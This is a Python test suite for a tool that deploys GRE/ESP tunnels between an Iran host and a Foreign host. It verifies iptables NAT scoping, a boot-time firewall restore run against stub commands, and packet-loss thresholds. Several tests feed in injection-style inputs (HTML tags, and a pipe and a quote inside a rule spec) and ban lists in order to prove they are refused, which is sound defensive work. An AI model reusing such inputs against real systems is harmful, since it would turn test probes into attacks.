        self.assertIn("RULETEXT", shown[5])
        self.assertNotIn("<img", shown[6], shown[6][:200])
        self.assertNotIn("<script>", shown[6], "pair names and rule text are stored free text")
        self.assertIn("&lt;img", shown[6])
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", "".join(shown)), [],
                         "the rendered card carries an address")

    def test_80_a_carrier_dnats_nothing_that_arrived_on_its_own_interface(self):
        """#40 Acceptance Test: the inner-frontend hairpin, closed by the rule that made it.

        The mechanism was measured, not reasoned (scratch/hairpin_mechanism_capture_20261011.out). Foreign
        connecting to Iran's own inner :443 arrived on Iran's carrier interface, matched the port-only
        PREROUTING DNAT, was rewritten to the *other end of the carrier*, and was forwarded back out the
        interface it came in on: per-rule counters moved `PREROUTING/DNAT +1` and `POSTROUTING/MASQUERADE
        +1` with `IpForwDatagrams +10`, and the post-NAT header `10.10.11.1.42566 > 10.10.11.2.443 [S]` was
        captured leaving Iran and answered by Foreign's xray. So a probe of one host's frontend was
        satisfied by its peer, which is what made every inner-frontend health check meaningless. Two things
        this pins down that a manual cannot:

          * the token that closes the loop is `! -i <carrier iface>` on the **DNAT**. The MASQUERADE is not
            the loop-maker, and a source condition cannot close it either - the hairpin's source is the
            peer's inner address, so `! -s <own inner>` is true of that packet and lets it through. The
            `! -s` scope stays because report058 measured it as required for the carrier's own probes to
            get a clean answer, not because it has anything to do with the loop.
          * the client path must survive the scoping. A client arrives on the outer interface, so excluding
            the carrier interface costs nothing; excluding anything else, or adding a positive interface
            match, would silently stop serving traffic on a rule that still verifies. That is why the
            interface condition is asserted as an exact set rather than as a substring.

        test_71 cannot see any of this - it pairs installs to deletes structurally, and both sides of the
        buggy pair were structurally symmetric. And the fix must not blind the shadowing gate it sits next
        to, so the recogniser is re-driven against the generator's own new text below.
        """
        ir_ip, fr_ip, pid, frontend = "198.51.100.10", "203.0.113.20", 7, 8443

        def as_delete(cmd: str) -> str:
            """The mirror of an install rule: verb swapped, every other token kept."""
            return re.sub(r"\s-A\s", " -D ", cmd, count=1) + " 2>/dev/null || true"

        for proto in ("GRE", "ESP"):
            plan = protocols.generate_deployment(proto, pid, ir_ip, fr_ip, frontend)
            iface = protocols.carrier_iface(proto, pid, "prod")
            tun_ir, tun_fr = protocols.carrier_inner_pair(proto, pid, "prod")
            dnats = [c for c in plan["iran_cmds"] if "PREROUTING" in c and "DNAT" in c]
            self.assertEqual(len(dnats), 2,
                             f"{proto}: expected the tcp and udp DNATs, got {dnats}")
            for cmd in dnats:
                self.assertIn(f"! -i {iface}", cmd,
                              f"{proto}: a DNAT that also matches packets arriving on the carrier "
                              f"interface forwards the peer's probe of this host's frontend back to the "
                              f"peer - the measured hairpin")
                # Exact set, not a substring: `! -i grep7` is the whole of the interface condition. A
                # positive `-i`, a second exclusion, or an exclusion naming the outer interface would each
                # pass a substring test and stop the rule serving real clients.
                self.assertEqual(re.findall(r"!?\s-i\s\S+", cmd), [f"! -i {iface}"],
                                 f"{proto}: the DNAT's interface condition is not exactly the carrier "
                                 f"interface, so either the loop is open or the client path is cut")
                # Verification asks for this substring (engine.py: `--to-destination <peer>:<port> in
                # o_nat`); scoping must not have reworded the destination it certifies.
                self.assertIn(f"--to-destination {tun_fr}:{frontend}", cmd,
                              f"{proto}: the scoped rule no longer names the destination the deploy "
                              f"verifies, so it would install and then fail its own verification")
                self.assertIn(f"--dport {frontend}", cmd)
                self.assertNotIn(f"! -s {tun_ir}", cmd,
                                 f"{proto}: a source exclusion on the DNAT is not what closes the loop "
                                 f"(the hairpin's source is {tun_fr}), so it must not stand in for `! -i`")

            # Every install has its delete, spelled the same way - `-D` matches a rule by its full
            # specification, so a delete that drops `! -i` no-ops and leaves the rule forever.
            for cmd in dnats:
                self.assertIn(as_delete(cmd), plan["teardown_iran"],
                              f"{proto}: the DNAT delete does not mirror the scoped install token for "
                              f"token, so the loop-closing rule survives its own teardown")
            masq = [c for c in plan["iran_cmds"] if "POSTROUTING" in c and "MASQUERADE" in c]
            self.assertEqual(len(masq), 1, f"{proto}: expected one MASQUERADE, got {masq}")
            self.assertIn(f"! -s {tun_ir}", masq[0], f"{proto}: lost report058's source scope")
            self.assertIn(as_delete(masq[0]), plan["teardown_iran"],
                          f"{proto}: the MASQUERADE delete does not mirror its install")

            # The fix belongs to the host that makes the forwarding decision. Nothing here changes Foreign.
            self.assertEqual([c for c in plan["foreign_cmds"]
                              if "PREROUTING" in c or "MASQUERADE" in c], [],
                             f"{proto}: Foreign gained a NAT rule it never had")

            # The shadowing gate must still read the new text: an operator's `-S` output now carries
            # `! -i <iface>` between the match and `--dport`, and a carrier whose own rule is in force must
            # not be refused by it, while a *different* pair's scoped rule must still be named.
            own = " ".join(dnats[0].split()[3:])  # drop `iptables -t nat -A`
            self.assertEqual(engine.carrier_dnat_conflict(own + "\n", frontend, tun_fr), "",
                             "the carrier's own scoped rule is being read as a shadow, so every redeploy "
                             "of this carrier would refuse")
            other = own.replace(f"{tun_fr}:{frontend}", f"10.10.99.2:{frontend}")
            self.assertIn("10.10.99.2", engine.carrier_dnat_conflict(other + "\n", frontend, tun_fr),
                          "a differently-scoped rule pointing somewhere else no longer registers as a "
                          "conflict: the gate was blinded by the new token")

        # The standalone root installer held the same two rules and has to retire the spellings it installed
        # earlier: PREROUTING is first-match, so appending a scoped rule behind a surviving port-only one
        # closes nothing while every check in the script still reports success.
        with open(os.path.join(verify_checksums.REPO_ROOT, "iran-gre.sh"), encoding="utf-8") as fh:
            installer = fh.read()
        for token, why in (
                ("-A PREROUTING -p $proto ! -i gre1",
                 "iran-gre.sh installs a DNAT that still matches packets arriving on gre1"),
                ("-C PREROUTING -p $proto ! -i gre1",
                 "iran-gre.sh probes for the unscoped rule but installs the scoped one, so a re-run "
                 "reports the old rule as the new one and adds nothing"),
                ("-D PREROUTING -p $proto --dport $p",
                 "iran-gre.sh leaves the port-only rule it installed earlier ahead of the scoped one, and "
                 "first-match means that rule still answers the probe"),
                ("-A POSTROUTING -d $KH_TUN ! -s $IR_TUN -j MASQUERADE",
                 "iran-gre.sh lost report058's source scope"),
                ("-D POSTROUTING -d $KH_TUN -j MASQUERADE",
                 "iran-gre.sh leaves the unscoped MASQUERADE it used to install in place")):
            self.assertIn(token, installer, why)
        inst = installer.index("-A PREROUTING -p $proto ! -i gre1")
        legacy = installer.index("-D PREROUTING -p $proto --dport $p")
        self.assertLess(inst, legacy,
                        "iran-gre.sh: the port-only rule is removed before the scoped one exists, which "
                        "leaves a window with no DNAT on a chain carrying live traffic")


    def test_81_the_firewall_manifest_is_a_lossless_function_of_the_deploy_commands(self):
        """#61 Acceptance Test: option (پ) - the product's own boot-time firewall restore.

        Foreign was rebooted for item #55 and every rule the product had installed went with the kernel:
        the deploy pushes `iptables` over SSH once and nothing re-issues them (item #54's inventory found no
        `/etc/rules.v4`, no persistent source at all). The round before this one closed that gap with a
        script that grepped `iptables -S` for the pair's comment and restored **only the filter table** -
        a fail-open by omission, because the rules that carry a tunnel are the NAT ones. So the manifest
        this test pins down carries table, chain, verb, position and spec per row, and the shape of the
        restore is argued from measurements in report062 rather than from a how-to.

        What a plain "the rules are listed" check would miss, and this does not:

          * losslessness. One row per install command, in the deploy's own order, derived by a *second*
            parser written here rather than by `fw_manifest_rows`. A skipped rule is exactly the defect
            this whole block replaces, and a regex that silently failed to match a new spelling would
            reproduce it.
          * no phantom unit. The manifest is applied by the carrier unit's own last `ExecStart`. A separate
            `-fw` unit would have to join `iran_units` to be started, and `failover.check_health` reads that
            list as "all of these must be active" - so the first upgrade after the change would see every
            already-deployed pair as DOWN and switch protocols over a unit that was never deployed.
          * teardown ordering. The manifest file is removed *before* the rule deletes: netfilter rules live
            in memory and die with the kernel, so the only way a torn-down pair's rules return is a
            surviving manifest.
          * the scopes from test_80 must survive into the rows, or the boot would restore the hairpin the
            last round closed.
        """
        ir_ip, fr_ip, pid, frontend = "198.51.100.10", "203.0.113.20", 7, 8443

        def split_fw_cmd(cmd, comment):
            """Independent reader of one install command: table, chain, verb, position, spec."""
            toks = cmd.split()
            self.assertEqual(toks[0], "iptables", f"not an iptables command: {cmd[:80]}")
            table, i = "filter", 1
            if toks[1] == "-t":
                table, i = toks[2], 3
            verb, chain = toks[i], toks[i + 1]
            self.assertIn(verb, ("-A", "-I"), f"a verb the manifest format has no field for: {cmd[:80]}")
            verb = verb[1:]  # the row carries the verb without its dash, which is what the applier tests
            i += 2
            pos = "0"
            if verb == "I":
                self.assertTrue(toks[i].isdigit(), f"-I without a position: {cmd[:80]}")
                pos, i = toks[i], i + 1
            tail = []
            for t in toks[i:]:
                if t in ("2>/dev/null", "||", "true"):
                    continue
                tail.append(t)
            spec = " ".join(tail)
            # The one unquoting the manifest is allowed to perform, asserted as exactly that: the comment
            # arrives quoted in the command and unquoted in the row, because bash does not re-honour quotes
            # found in a variable. Any other quote would be split into a different argument by the applier.
            quoted = f'--comment "{comment}"'
            self.assertIn(quoted, spec, f"the row is not scoped by this pair's comment: {spec[:80]}")
            spec = spec.replace(quoted, f"--comment {comment}")
            self.assertNotIn('"', spec, f"a quote survived the comment strip: {spec[:80]}")
            return table, chain, verb, pos, spec

        for proto in ("GRE", "ESP"):
            plan = protocols.generate_deployment(proto, pid, ir_ip, fr_ip, frontend)
            iface = protocols.carrier_iface(proto, pid, "prod")
            tun_ir, tun_fr = protocols.carrier_inner_pair(proto, pid, "prod")
            cmt = protocols.generate_firewall_comment(f"{pid}-prod", proto)
            svc = f"best-tunnel-prod-p{pid}-{proto.lower()}"

            for role, files_key, cmds_key, units_key, tdn_key in (
                    ("iran", "iran_files", "iran_cmds", "iran_units", "teardown_iran"),
                    ("foreign", "foreign_files", "foreign_cmds", "foreign_units",
                     "teardown_foreign")):
                files, cmds, teardown = plan[files_key], plan[cmds_key], plan[tdn_key]
                manifest_path = f"{protocols.FW_MANIFEST_DIR}/{svc}-fw.rules"
                self.assertIn(manifest_path, files,
                              f"{proto}/{role}: no manifest is staged, so nothing survives a reboot")
                self.assertIn(protocols.FW_REAPPLY_PATH, files,
                              f"{proto}/{role}: the manifest has no applier to run it")
                # The unit list must be exactly the carrier. This is the phantom-unit regression.
                self.assertEqual(plan[units_key], [svc],
                                 f"{proto}/{role}: a unit was added to the plan's unit list; the health "
                                 f"gate reads that list as 'all must be active' and an already-deployed "
                                 f"pair would be scored DOWN by the next upgrade")
                self.assertEqual([p for p in files if p.endswith("-fw.service")], [],
                                 f"{proto}/{role}: a separate firewall unit file exists")

                lines = files[manifest_path].splitlines()
                rows = [ln for ln in lines if ln.startswith("R|")]
                sysctls = [ln for ln in lines if ln.startswith("S|")]
                installs = [c for c in cmds if c.startswith("iptables")]
                self.assertEqual(len(rows), len(installs),
                                 f"{proto}/{role}: {len(installs)} install commands produced {len(rows)} "
                                 f"rows - a rule the boot will not restore")
                self.assertEqual(sysctls, ["S|net.ipv4.ip_forward=1"],
                                 f"{proto}/{role}: ip_forward is as boot-fragile as the rules it feeds")

                for cmd, row in zip(installs, rows):
                    table, chain, verb, pos, spec = split_fw_cmd(cmd, cmt)
                    self.assertEqual(row, f"R|{table}|{chain}|{verb}|{pos}|{spec}",
                                     f"{proto}/{role}: this install command is not the row that restores "
                                     f"it:\n  cmd {cmd}\n  row {row}")

                unit = files[f"/etc/systemd/system/{svc}.service"]
                exec_line = f"ExecStart=/bin/bash {protocols.FW_REAPPLY_PATH} {manifest_path}"
                self.assertIn(exec_line, unit,
                              f"{proto}/{role}: the carrier unit never applies its manifest")
                # `/bin/bash <path>`, never the executable bit: `write_file` stages everything 0600.
                self.assertTrue(exec_line.startswith("ExecStart=/bin/bash "),
                                f"{proto}/{role}: the applier is invoked by its own mode bit, which the "
                                f"0600 staging never sets")
                # The rules must be issued by the start phase *after* the one that creates the interface
                # they name, and before the stop that removes it.
                creator = "ip tunnel add" if proto == "GRE" else "ip link add name"
                self.assertGreater(unit.index(exec_line), unit.index(creator),
                                   f"{proto}/{role}: the rules are issued before {creator}, so every row "
                                   f"naming -i {iface} is refused")
                self.assertLess(unit.index(exec_line), unit.index("\nExecStop="),
                                f"{proto}/{role}: the applier is ordered after the stop, so a start never "
                                f"installs it and a stop does")

                # The scoping test_80 measured has to be the scoping that is *restored*, or a reboot reopens
                # the hairpin while every rule count still looks right.
                if role == "iran":
                    dnat_rows = [r for r in rows if "DNAT" in r]
                    self.assertEqual(len(dnat_rows), 2, f"{proto}: the DNAT rows moved")
                    for r in dnat_rows:
                        self.assertIn(f"! -i {iface}", r,
                                      f"{proto}: boot would restore a DNAT that matches the carrier's own "
                                      f"incoming probes")
                    self.assertIn(f"! -s {tun_ir}", [r for r in rows if "MASQUERADE" in r][0],
                                  f"{proto}: the MASQUERADE row lost report058's source scope")
                    self.assertEqual(len([r for r in rows if "PREROUTING" in r]), 2,
                                     f"{proto}: Foreign's NAT rules leaked into Iran's manifest")
                else:
                    self.assertEqual([r for r in rows if "PREROUTING" in r or "MASQUERADE" in r], [],
                                     f"{proto}: Foreign gained NAT rules it never installed")
                    self.assertIn(f"-i {iface}", " ".join(rows),
                                  f"{proto}: the carrier's own INPUT accepts are missing from the manifest")

                # A teardown that leaves the manifest behind resurrects the pair's rules at the next boot.
                rm = f"rm -f {manifest_path}"
                self.assertIn(rm, teardown, f"{proto}/{role}: the manifest outlives its pair")
                deletes = [i for i, c in enumerate(teardown) if " -D " in c]
                self.assertTrue(deletes, f"{proto}/{role}: the teardown deletes no rules at all")
                self.assertLess(teardown.index(rm), min(deletes),
                                f"{proto}/{role}: the rules are deleted first, so a teardown that dies "
                                f"half-way leaves a file that reinstalls them")
                self.assertEqual([c for c in teardown if c.startswith(f"rm -f {protocols.FW_REAPPLY_PATH}")],
                                 [], f"{proto}/{role}: one pair's teardown deletes the script every other "
                                     f"pair on the host still runs")

                # The three rejected designs, asserted as absent rather than as a comment that they were
                # rejected: `iptables-restore` flushes the chains it names and Foreign's PREROUTING is
                # shared with Docker, and netfilter-persistent is ruled out by ruling ۱.
                blob = files[manifest_path] + unit + files[protocols.FW_REAPPLY_PATH] + " ".join(teardown)
                for banned in ("iptables-restore", "iptables-save", "netfilter-persistent",
                               "rules.v4", "apt-get"):
                    self.assertNotIn(banned, blob,
                                     f"{proto}/{role}: the durable path reaches for {banned}")
                self.assertNotIn("-F", files[protocols.FW_REAPPLY_PATH],
                                 "the applier flushes a chain; it may only add to or read one")
                # The ESP carrier's SA keys live in its 0600 batch file and nowhere else. A manifest is
                # `cat`-ed into the journal by nothing, but it is read by a service and dumped by any
                # support ticket that attaches `/etc/best-tunnel`, so it stays free of key material.
                for banned_secret in ("0x", "aead", "xfrm"):
                    self.assertNotIn(banned_secret, files[manifest_path],
                                     f"{proto}: {banned_secret} reached a firewall manifest")

        # The script's own contract, in its text: confirm before issuing, confirm again after, refuse to
        # install rows that name an interface that never appeared, and stop on a line it does not know.
        script = protocols.FW_REAPPLY_SCRIPT
        self.assertLess(script.index("-C \"$"), script.index("-I \"$"), "the applier issues a rule it has "
                                                                        "not tested for already being present")
        self.assertIn("unconfirmed", script, "an accepted `iptables` exit code is trusted as proof the "
                                             "rule is in the table")
        for needle in ('"$(command -v iptables-nft', "carrier interface $IFACE never appeared",
                       'unrecognised line kind', 'manifest names no rules'):
            self.assertIn(needle, script, f"the applier no longer contains its {needle[:32]!r} refusal")

    def test_81b_the_manifest_refuses_to_be_built_wrong(self):
        """Mutation seals for the manifest builder: each control shown able to fail.

        Every one of these is a manifest that would *look* applied on the host: a row with another pair's
        comment is a deletion target for that tenant, a command the parser does not recognise is a rule the
        boot silently omits, and a spec carrying a character the applier word-splits on installs something
        other than what was tested for.
        """
        cmt = "best-tunnel-7-prod-GRE"
        good = f'iptables -t nat -A PREROUTING -p tcp ! -i grep7 --dport 8443 -m comment --comment "{cmt}" ' \
               f"-j DNAT --to-destination 10.10.17.2:8443"
        self.assertEqual(len(protocols.fw_manifest_rows([good], cmt)), 1,
                         "the builder no longer produces a row for a command it should accept - every "
                         "seal below would then 'pass' by producing nothing")

        cases = {
            "another pair's comment": (
                good.replace(cmt, "best-tunnel-8-prod-GRE"), "not scoped by this pair"),
            "no comment at all": (
                "iptables -A FORWARD -p tcp -j ACCEPT", "not scoped by this pair"),
            "a verb it does not know": (
                f"iptables -N BT_{cmt}", "cannot parse"),
            "a flush dressed as a rule": (
                f'iptables -F FORWARD -m comment --comment "{cmt}"', "cannot parse"),
            "a comment containing a space": (
                f"iptables -A FORWARD -m comment --comment \"two words\" -j ACCEPT",
                "not scoped by this pair"),
            "a pipe inside the spec": (
                f'iptables -A FORWARD -m comment --comment "{cmt}" -m owner --uid-owner 1|2 -j ACCEPT',
                "word-splits"),
            "a quote inside the spec": (
                f"iptables -A FORWARD -m comment --comment \"{cmt}\" -m string --string \"a b\" -j DROP",
                "word-splits"),
        }
        for label, (cmd, why) in cases.items():
            with self.assertRaises(ValueError) as ctx:
                protocols.fw_manifest_rows([cmd], cmt)
            self.assertIn(why, str(ctx.exception),
                          f"the builder accepted {label} ({str(ctx.exception)[:90]})")
        with self.assertRaises(ValueError):
            protocols.fw_manifest_rows(["modprobe ip_gre || true"], cmt)

        # The unit-ordering helper's own seals: a unit whose ExecStop it cannot see is a unit in which the
        # rules would be applied nowhere, and two ExecStops make "last" ambiguous.
        with self.assertRaises(ValueError):
            protocols._add_fw_exec("[Service]\nExecStart=/sbin/ip link set grep7 up\n", "ExecStart=x")
        with self.assertRaises(ValueError):
            protocols._add_fw_exec("[Service]\nExecStart=a\nExecStop=b\nExecStop=c\n", "ExecStart=x")
        shaped = protocols._add_fw_exec("[Service]\nExecStart=a\nExecStop=b\n", "ExecStart=/bin/bash m")
        self.assertEqual(shaped, "[Service]\nExecStart=a\nExecStart=/bin/bash m\nExecStop=b\n",
                         "the applier is no longer the last thing the start phase runs")

    def test_82_the_shipped_applier_is_executed_against_a_fake_netfilter(self):
        """#61 Acceptance Test: run the text that goes to the host, do not read it.

        Substring assertions on `FW_REAPPLY_SCRIPT` cannot see the two properties the boot restore depends
        on: that `-I <chain> <pos>` is passed *with* its position (a dropped `$_p` would append a rule that
        first-match PREROUTING then reads in the wrong order, while every count still looked right), and
        that a second application adds nothing. So this executes the shipped script under bash against a
        stub `iptables` that keeps chains in a file, and compares the resulting chains with a model written
        here from the manifest rows.

        It also drives the refusals: an interface that never appears must install *nothing*, a corrupt
        manifest must stop the run, an empty one must not report success, and an apply that iptables accepts
        but does not then show in the table must be reported as unconfirmed rather than counted as applied.
        """
        bash = _product_bash()
        if bash is None:
            self.skipTest("no bash on this host: the applier text cannot be executed, only read")

        plan = protocols.generate_deployment("GRE", 7, "198.51.100.10", "203.0.113.20", 8443)
        manifest_path = f"{protocols.FW_MANIFEST_DIR}/best-tunnel-prod-p7-gre-fw.rules"
        rows = [ln for ln in plan["iran_files"][manifest_path].splitlines() if ln.startswith("R|")]
        iface = protocols.carrier_iface("GRE", 7, "prod")

        STUB_IPTABLES = _FAKE_IPTABLES
        STUB_IP = _FAKE_IP
        STUB_SYSCTL = _FAKE_SYSCTL
        state_of = _fake_state_of
        calls_of = _fake_calls_of


        with tempfile.TemporaryDirectory(prefix="bt_fwreapply_") as tmp:
            tmp = tmp.replace("\\", "/")
            bindir = os.path.join(tmp, "bin")
            os.makedirs(bindir)
            # The shipped text, staged exactly as `write_file` stages it, and run the way the unit runs it.
            script = os.path.join(tmp, "reapply.sh")
            with open(script, "w", newline="\n", encoding="utf-8") as fh:
                fh.write(protocols.FW_REAPPLY_SCRIPT)
            man = os.path.join(tmp, "manifest.rules")
            with open(man, "w", newline="\n", encoding="utf-8") as fh:
                fh.write(plan["iran_files"][manifest_path])
            for name, body in (("iptables", STUB_IPTABLES), ("iptables-nft", STUB_IPTABLES),
                               ("ip", STUB_IP), ("sysctl", STUB_SYSCTL), ("sleep", "#!/bin/bash\nexit 0\n")):
                p = os.path.join(bindir, name)
                with open(p, "w", newline="\n", encoding="utf-8") as fh:
                    fh.write(body)
            subprocess.run([bash, "-c", f'chmod 755 "{bindir}"/*'], capture_output=True, text=True)
            state = os.path.join(tmp, "state")
            log = os.path.join(tmp, "calls.log")
            slog = os.path.join(tmp, "sysctl.log")

            def run(manifest, iface_name=iface, extra=None):
                for f in (log, slog):
                    with open(f, "w"):
                        pass
                env = dict(os.environ)
                env["PATH"] = bindir + os.pathsep + env["PATH"]
                env.update({"FAKE_IPT_STATE": state, "FAKE_IPT_LOG": log, "FAKE_SYSCTL_LOG": slog,
                            "FAKE_IFACE": iface_name})
                if extra:
                    env.update(extra)
                r = subprocess.run([bash, script, manifest], capture_output=True, text=True, env=env)
                out = ((r.stdout or "") + (r.stderr or "")).replace("\0", "").strip()
                return r.returncode, out

            # Expected chains, modelled here from the rows: `-I` inserts at its position, `-A` appends.
            expected = {}
            for row in rows:
                _, t, c, v, pos, spec = row.split("|", 5)
                lst = expected.setdefault(f"{t}|{c}", [])
                if v == "I" and pos != "0":
                    lst.insert(int(pos) - 1, spec)
                else:
                    lst.append(spec)

            rc, out = run(man)
            self.assertEqual(rc, 0, f"a boot from an empty table failed: {out}")
            self.assertEqual(state_of(state), expected,
                             f"the replayed chain is not the chain the deploy built:\n{out}")
            self.assertIn(f"applied={len(rows)}", out, f"nothing was restored: {out}")
            self.assertIn("failed=0 unconfirmed=0", out, out)

            with open(state, encoding="utf-8") as fh:
                first = fh.read()
            rc2, out2 = run(man)
            self.assertEqual(rc2, 0, f"the second application failed: {out2}")
            self.assertIn(f"present={len(rows)} applied=0", out2,
                          f"a re-run did not find its own rules: {out2} - the duplicating loop this "
                          f"applier exists to avoid is back")
            with open(state, encoding="utf-8") as fh:
                second = fh.read()
            self.assertEqual(second, first,
                             "an idempotent run still moved a rule")

            # An `-I ... 1` row deleted behind the product's back must come back at position 1, which is
            # the one proof that the position survives the round trip through the manifest.
            input_key = "filter|INPUT"
            held = state_of(state)
            target = held[input_key][0]
            with open(state, "w", newline="\n", encoding="utf-8") as fh:
                fh.write("\n".join(l for l in first.splitlines()
                                   if l != f"{input_key}|{target}") + "\n")
            rc3, out3 = run(man)
            self.assertEqual(rc3, 0, out3)
            self.assertEqual(state_of(state)[input_key][0], target,
                             "the restored rule landed at the end of INPUT, so `-I` lost its position")
            self.assertEqual(state_of(state), expected, f"the repaired chain is not the deploy's:\n{out3}")

            # The neighbour that the `iptables-restore` design would have erased: Docker's own PREROUTING
            # entry, measured on the live Foreign host. Restoring this pair must leave it where it was.
            with open(state, "w", newline="\n", encoding="utf-8") as fh:
                fh.write("nat|PREROUTING|-m addrtype --dst-type LOCAL -j DOCKER\n")
            rc4, out4 = run(man)
            self.assertEqual(rc4, 0, out4)
            docker = "nat|PREROUTING"
            self.assertEqual(state_of(state)[docker][0], "-m addrtype --dst-type LOCAL -j DOCKER",
                             "the pair's restore reordered or removed a rule it does not own")
            self.assertFalse(os.path.exists(state + ".flushed"),
                             "the applier flushed a chain; it may only add to one")
            # The neighbour chain still has to hold *its own* rows in the deploy's order, and behind what
            # was already there: `-A` appends, so the pair can neither jump ahead of Docker's rule nor
            # re-order its own two DNATs - which is the first-match property the hairpin survived by.
            self.assertEqual(state_of(state)[docker][1:], expected[docker],
                             "the pair's rows landed in PREROUTING in the wrong order, or ahead of a rule "
                             "it does not own")
            self.assertEqual([c for c in calls_of(log) if "FORBIDDEN-OP" in c], [],
                             f"the applier issued a chain-wide operation: {calls_of(log)}")

            # Refusals. Each one is a state in which installing the rows would be worse than installing
            # none of them.
            rc5, out5 = run(man, iface_name="never-created-iface")
            self.assertEqual(rc5, 1, f"a carrier that never appeared was reported as: {out5}")
            self.assertEqual(calls_of(log), [],
                             "rules naming an absent interface were issued anyway")
            self.assertIn("never appeared", out5)

            corrupt = os.path.join(tmp, "corrupt.rules")
            with open(corrupt, "w", newline="\n", encoding="utf-8") as fh:
                fh.write(plan["iran_files"][manifest_path] + "X|this line kind does not exist\n")
            rc6, out6 = run(corrupt)
            self.assertEqual(rc6, 2, f"a manifest with a foreign line was applied anyway: {out6}")
            self.assertEqual(calls_of(log), [], "the refusal still touched the kernel")

            empty = os.path.join(tmp, "empty.rules")
            with open(empty, "w", newline="\n", encoding="utf-8") as fh:
                fh.write("@kind best-tunnel-firewall-manifest-v1\n@iface \n")
            rc7, out7 = run(empty)
            self.assertEqual(rc7, 2, f"a manifest with no rules reported: {out7}")

            # A rule `iptables` accepts but does not then show in the table: the exit code cannot be the
            # evidence, and the unit must not come up active on the strength of it.
            open(state, "w").close()
            rc8, out8 = run(man, extra={"FAKE_IPT_NEVER_MATCH": "1"})
            self.assertEqual(rc8, 1, f"an unconfirmable apply reported success: {out8}")
            self.assertIn(f"unconfirmed={len(rows)}", out8,
                          f"the post-apply check is not counting what it installs: {out8}")

            rc9, out9 = run(man, extra={"FAKE_SYSCTL_FAIL": "1"})
            self.assertEqual(rc9, 1, f"a refused sysctl was swallowed: {out9}")

            missing = run(os.path.join(tmp, "no-such-file.rules"))
            self.assertEqual(missing[0], 2, f"a manifest that is not there answered: {missing[1]}")

    def test_84_the_loss_thresholds_need_a_sample_that_can_state_them(self):
        """#41 Acceptance Test: 2-4% loss is a band, so the probe has to count enough packets to see it.

        `carrier_inner_reachable` used to decide a carrier with `"0% packet loss" in out` on `ping -c 2`.
        That is not a threshold: two packets answer 0%, 50% or 100%, so a path losing 1 packet in 50 - well
        inside the band this infrastructure measures - was refused by the old text, and the refusal is
        acted on twice (a deploy that fails, a failover that switches protocol away). These cases are
        behavioural: under the old code every transcript below that is not literally "0% packet loss" read
        unreachable, and none of them can be reproduced by the test wording.
        """
        class Runner:
            def __init__(self, out):
                self.out, self.commands = out, []

            def run(self, cmd, **kw):
                self.commands.append(cmd)
                return 0, self.out, ""

        def transcript(sent, recv, pct, rtt=41.0):
            return (f"{sent} packets transmitted, {recv} received, {pct}% packet loss, time {sent * 20}ms\n"
                    f"rtt min/avg/max/mdev = {rtt - 2:.3f}/{rtt:.3f}/{rtt + 2:.3f}/2.000 ms\n")

        # The threshold has to be expressible in the sample: one packet out of N is 100/N percent, and
        # separating the clean band from the accepted one needs that granularity at or below the clean
        # bound. Assert the relation, not the constant, so changing either number has to re-measure both.
        self.assertLessEqual(100.0 / engine.UNDERLAY_PROBE_SAMPLES, engine.UNDERLAY_LOSS_CLEAN_PCT,
                             f"{engine.UNDERLAY_PROBE_SAMPLES} samples cannot tell "
                             f"{engine.UNDERLAY_LOSS_CLEAN_PCT}% from {engine.UNDERLAY_LOSS_ACCEPT_PCT}%")

        for sent, recv, pct, want_reach, want_band in (
                (50, 50, 0.0, True, "CLEAN"),
                (50, 49, 2.0, True, "CLEAN"),
                (50, 48, 4.0, True, "MARGINAL"),
                (50, 46, 8.0, False, "TOO_LOSSY"),
                (50, 0, 100.0, False, "UNREACHABLE")):
            r = Runner(transcript(sent, recv, pct))
            reach, detail = engine.carrier_inner_reachable(r, "GRE", 1)
            self.assertEqual(reach, want_reach, f"{pct}% loss -> {detail}")
            self.assertIn(want_band, detail, f"{pct}% loss bandaged by the wrong verdict: {detail}")
            self.assertIn(f"ping -c {engine.UNDERLAY_PROBE_SAMPLES}", r.commands[0],
                          "the probe does not count the samples the thresholds are stated in")
            self.assertIn("-I grep1", r.commands[0], "the inner probe is not bound to the carrier interface")

        # A percentage that never got parsed is not a healthy path. The band says so explicitly, because
        # "unparseable" and "dead" need different fixes and a reader has to be able to tell them apart.
        r = Runner("PING 10.10.11.2 (10.10.11.2) 56(84) bytes of data.\n")
        reach, detail = engine.carrier_inner_reachable(r, "GRE", 1)
        self.assertFalse(reach, f"a probe with no summary claimed a working carrier: {detail}")
        self.assertIn("NOT_MEASURED", detail, detail)

        # The reply count is part of the verdict, and the transcript says `N received` - the word
        # "packets" appears only before "transmitted". A pattern that required it twice parsed zero
        # replies out of every real ping and made every leg read BLOCKED beside a 0% loss figure.
        res = engine.ping_result(transcript(50, 50, 0.0))
        self.assertEqual((res.sent, res.received, res.loss_pct), (50, 50, 0.0), tuple(res))

    def test_85_the_underlay_preflight_names_its_vantage_and_refuses_to_credit_a_loop(self):
        """#41 Acceptance Test: which host asked, and which address answered, are part of the result.

        Three measured confusions this function exists to keep apart. Peer-to-peer ICMP to the public
        address is filtered on this infrastructure, so an outer leg that reads 100% must not block a
        carrier whose inner leg is clean. A probe aimed at an address the issuing host itself holds
        answers with no path involved - the shape that made Iran's inner :443 "answer" through a DNAT
        while nothing was carried - so it is reported as a loop and never as a pass. And the two inner
        ends are one /30, so the Foreign probe has to be aimed at Iran's address rather than at its own.
        """
        class Runner:
            def __init__(self, by_substring, default):
                self.by_substring, self.default, self.commands = by_substring, default, []

            def run(self, cmd, **kw):
                self.commands.append(cmd)
                for k, v in self.by_substring.items():
                    if k in cmd:
                        return 0, v, ""
                return 0, self.default, ""

            def close(self):
                pass

        inner = protocols.carrier_inner_pair("GRE", 1, "prod")
        pair = {"id": 1, "frontend": 443, "underlay_carrier": "gre",
                "iran": {"host": "198.51.100.10", "dial_host": inner[0]},
                "foreign": {"host": "203.0.113.20", "dial_host": inner[1]}}

        def stat(sent, recv, pct):
            return f"{sent} packets transmitted, {recv} received, {pct}% packet loss\n"

        # Outer filtered, inner clean, in both directions: the carrier works, and only the inner legs say so.
        ir = Runner({"-I grep1": stat(50, 50, 0.0)}, stat(50, 0, 100.0))
        fr = Runner({"-I grep1": stat(50, 50, 0.0)}, stat(50, 0, 100.0))
        out = engine.underlay_preflight(pair, ir, fr, dry_run=False)
        self.assertEqual(out["verdict"], "CLEAN", out["summary"])
        self.assertTrue(out["ok"], out["summary"])
        outer = [l for l in out["legs"] if l["kind"] == "outer"]
        self.assertTrue(outer and all(not l["decides"] for l in outer),
                        f"the filtered management path was allowed to decide: {out['legs']}")
